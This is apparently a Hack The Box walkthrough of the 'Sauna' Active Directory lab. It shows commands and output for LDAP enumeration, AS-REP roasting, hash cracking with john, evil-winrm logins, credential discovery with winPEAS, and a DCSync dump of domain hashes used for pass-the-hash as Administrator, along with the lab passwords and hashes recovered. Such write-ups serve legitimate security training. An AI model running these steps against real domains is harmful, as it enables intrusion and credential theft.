---
"title": "Hack The Box - Sauna"
"date": 2020-07-19
"tags": ["windows", "easy", "ldap", "kerberos", "secretsdump", "dcsync", "sharphound",
  "AD", "as-rep"]
"keywords": ["windows", "easy", "ldap", "kerberos", "secretsdump", "dcsync", "sharphound",
  "AD", "as-rep"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Sauna is an easy AD machine, getting initial is by gathering usernames from the web and doing AS-REP Roasting, we can get a user's hash. And winPEAS reveals svc_loanmgr's password in plain text and Getting System is by doing DC Sync Attack."
"featured_image": "/img/htb-sauna/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-sauna/Untitled.png)

Sauna is an easy AD machine, getting initial is by gathering usernames from the web and doing AS-REP Roasting, we can get a user's hash. And winPEAS reveals svc_loanmgr's password in plain text and Getting System is by doing DC Sync Attack.

Link: [https://www.hackthebox.eu/home/machines/profile/229](https://www.hackthebox.eu/home/machines/profile/229)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49686/tcp open  unknown
49696/tcp open  unknown
```

## HTTP Enumeration

It's a normal webpage, Let's see what we get here.

![Untitled](/img/htb-sauna/Untitled%201.png)

At the `/about.html` page, I found some of the Team members name. Maybe we can save it for users.

![Untitled](/img/htb-sauna/Untitled%202.png)

## LDAP Enumeration

Since port 389 is open on this box, We can use a nmap script for enumeration

```bash
root@w0lf:~/CTF/HTB/Boxes/Sauna#  nmap -p 389 --script ldap-search 10.10.10.175
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-10 12:19 IST
Nmap scan report for sauna.htb (10.10.10.175)
Host is up (0.23s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search: 
|   Context: DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: DC=EGOTISTICAL-BANK,DC=LOCAL
|         objectClass: top
|         objectClass: domain
|         objectClass: domainDNS
|         distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
|         instanceType: 5
|         whenCreated: 2020/01/23 05:44:25 UTC
|         whenChanged: 2020/05/10 00:42:54 UTC
|         subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|         subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|         subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         uSNCreated: 4099
|         dSASignature: \x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC
|         uSNChanged: 53269
|         name: EGOTISTICAL-BANK
|         objectGUID: 504e6ec-c122-a143-93c0-cf487f83363
|         \xDF\xC7\x14\x03\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC	\xB0\x00\x00\x00\x00\x00\x00\xD4\x04R\x14\x03\x00\x00\x00
|         creationTime: 132335449745906717
|         forceLogoff: -9223372036854775808
|         lockoutDuration: -18000000000
|         lockOutObservationWindow: -18000000000
|         lockoutThreshold: 0
|         maxPwdAge: -36288000000000
|         minPwdAge: -864000000000
|         minPwdLength: 7
|         modifiedCountAtLastProm: 0
|         nextRid: 1000
|         pwdProperties: 1
|         pwdHistoryLength: 24
|         objectSid: 1-5-21-2966785786-3096785034-1186376766
|         serverState: 1
|         uASCompat: 1
|         modifiedCount: 1
|         auditingPolicy: \x00\x01
|         nTMixedDomain: 0
|         rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|         fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         systemFlags: -1946157056
|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         isCriticalSystemObject: TRUE
|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
|         masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         ms-DS-MachineAccountQuota: 10
|         msDS-Behavior-Version: 7
|         msDS-PerUserTrustQuota: 1
|         msDS-AllUsersTrustQuota: 1000
|         msDS-PerUserTrustTombstonesQuota: 10
|         msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         msDS-NcType: 0
|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
|         dc: EGOTISTICAL-BANK
|     dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```

The only thing I got here is a new domain name `EGOTISTICAL-BANK.local/`

## AS-Rep Roasting

Since port 88 is open, we can move on to the kerberosting technique. But to do Kerberosting technique we need credentials on the domain to authenticate. But we have a chance if `Do not require Kerberos preauthentication` is True. There is a tool called `GetNPUsers.py` from [Impackets](https://github.com/SecureAuthCorp/impacket).

This is the tool we looking for, let’s give a try.

![Untitled](/img/htb-forest/296181db8d754f9989a8d896078908ba.png)

I created a wordlist by using the Team Members Names, With their first name as Initial and also separated them with a period.

```bash
root@w0lf:~/CTF/HTB/Boxes/Sauna# cat names.txt 
Fergus.Smith 
FergusSmith 
FSmith
ShaunCoins
SCoins
Shaun.Coins
HugoBear
Hugo.Bear
HBear
BowieTaylor
Bowie.Taylor
BTaylor
SteveKerb
Steve.Kerb
SKerb
SophieDriver
Sophie.Driver
SDriver
```

Time to run GetNPUsers with the wordlist we just created and I chose the hash format as `john` which is easy to crack. 

```bash
root@w0lf:~/CTF/HTB/Boxes/Sauna# GetNPUsers.py -usersfile names.txt -dc-ip 10.10.10.175 -format john -request EGOTISTICAL-BANK.local/
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL:23d30ca90b171a97e64c4dcac011ebaa$bb5f719f64572ca1fded7b0a6077df0776de532e1dcdfbb7ec857c6eb1937f584727fa1a7662470abf08a1ce8e2885219062f7819646bdfdd45b071467686e9a3aa638c2be36b455a6568035fe03740ef68e48e4c7463ae2ea71a14c4e2ce2cbb0432cd0ce10f4e086805455d9628b2909247f56d8ae9bb21b95390efe773faf31d8a13e75f25fb74d8530b1b2867d4d65bb6eac2abf8f4737a4826d449c2337b293383128c0bea437a2c8b0a23878a27fea17ce62719e62d86b22fc1d81afe501d36872f8113e3c35150066f02de4a791d38f55fd75783670f8333a3207f07ea875f6b036a753a1bc90e806e9ef6a00685b813c45575b49816550dd23a13e93
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

We got user `FSmith`'s Hash, Lets crack it using `john`

Now we can login with them `FSmith : Thestrokes23`

```bash
root@w0lf:~/CTF/HTB/Boxes/Sauna# john --wordlist=/usr/share/wordlists/rockyou.txt hash.john 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:07 DONE (2020-05-10 12:32) 0.1386g/s 1461Kp/s 1461Kc/s 1461KC/s Tiffani1432..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@w0lf:~/CTF/HTB/Boxes/Sauna# john --show hash.john 
$krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL:Thestrokes23

1 password hash cracked, 0 left
```

## Getting User Shell

We know port 5985 is open, so I used `evil-winrm` to login.

```bash
root@w0lf:~/CTF/HTB/Boxes/Sauna# evil-winrm -i 10.10.10.175 -u FSmith -p 'Thestrokes23' 

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> 
```

I uploaded [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)  enumeration Script and it reveals the password for user `svc_loanmgr`

```powershell
[+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

Using the password we got from winPEAS, I logged in as user `svc-loanmgr` and the name is different in winPEAS, to get the real name we can run `net user` which will show us all the users in the machine.

```powershell
root@w0lf:~/CTF/HTB/Boxes/Sauna# evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> 
```

## Privilege Escalation

Since its AD machine, I decided to check this user in BloodHound. I gonna run `Sharphound` to collect all the data and copy it to my machine so I can import it to `BloodHound`

Evil-WinRM makes our work easier to upload a file and download it to our machine.

Once uploaded I executed it.

![Untitled](/img/htb-sauna/Untitled%203.png)

> ./Sharphound.exe -c all

> -c CollectionMethods

Drag the .zip file to the BloodHound. Once its extracted successfully you get a message.

![Untitled](/img/htb-sauna/Untitled%204.png)

Now **Queries** -> **Find Principals with DCSync Rights**

![Untitled](/img/htb-sauna/gg.png)

And BloodHound reveals that the User svc_loanmgr has the permission on `GetchangesAll`

On Right clicking mouse and `?help` option it gives us info about the how to abuse it.

![Untitled](/img/htb-sauna/Untitled%205.png)

It told us to do DCSync Attack, to do that, there is plenty of ways but I gonna use `secretsdump.py` from [Impackets.](https://github.com/SecureAuthCorp/impacket)

By running that script we got `Administrator` NTML hash, we can use that to login.

```powershell
root@w0lf:~/CTF/HTB/Boxes/Sauna# secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:e687c0ad5de21a940ade6df2cc1cc3df:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:549f90ea59d140af56af90f5d43069223aeb973d75017ab5156ca7511aa3a77b
SAUNA$:aes128-cts-hmac-sha1-96:dbe40d5e1370fab8a2e4ab6b3610ab92
SAUNA$:des-cbc-md5:104c515b86739e08
[*] Cleaning up...
```

We can use `-H` to mention the hash and login directly in `evil-winrm` no need of cracking the NTML hash.

![Untitled](/img/htb-sauna/Untitled%206.png)

We own the Box!!